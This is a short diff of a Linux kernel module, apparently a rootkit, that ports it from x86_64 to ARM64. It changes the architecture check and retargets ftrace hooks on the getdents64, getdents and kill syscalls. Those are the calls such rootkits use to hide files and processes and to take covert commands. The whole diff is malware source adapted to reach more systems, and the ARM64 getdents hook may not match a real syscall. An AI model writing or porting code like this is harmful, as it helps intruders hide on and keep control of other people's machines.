@@ -17,7 +17,7 @@ MODULE_VERSION("0.5");
  * to use the pt_regs struct instead of the more familar function
  * prototype declaration. We have to check for this, and set a
  * variable for later on */
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#if defined(CONFIG_ARM64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
@@ -382,9 +382,9 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__arm64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__arm64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__arm64_sys_kill", hook_kill, &orig_kill),
 };
 
 /* Module initialization function */
